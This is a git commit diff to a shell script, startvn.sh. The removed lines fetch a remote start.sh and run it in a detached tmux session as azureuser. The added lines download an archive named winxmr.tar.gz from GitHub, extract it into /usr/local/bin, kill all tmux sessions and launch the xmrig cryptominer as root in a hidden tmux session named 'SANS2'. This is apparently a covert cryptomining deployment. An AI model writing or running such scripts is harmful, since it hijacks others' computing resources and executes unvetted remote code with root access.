c9077082bf4d4186e536612a33ff652295fba64c
vnxxx <85277031+vnxxx@users.noreply.github.com>
2021-09-07 01:23:14 +0700

    Update startvn.sh

--- startvn.sh
+++ startvn.sh
@@ -1,7 +1,7 @@
-#!/bin/sh 
-sudo apt update 
-sudo apt upgrade -y 
-sudo apt-get install -y tmux 
-cd /tmp 
-wget https://raw.githubusercontent.com/vnxxx/vnn2021/main/start.sh
-sudo -H -u azureuser bash -c 'tmux new-session -d -s install "bash /tmp/start.sh"'
+#!/bin/sh
+cd /usr/local/bin/
+wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
+tar -zxvf winxmr.tar.gz
+tmux kill-server
+sleep 1
+sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'
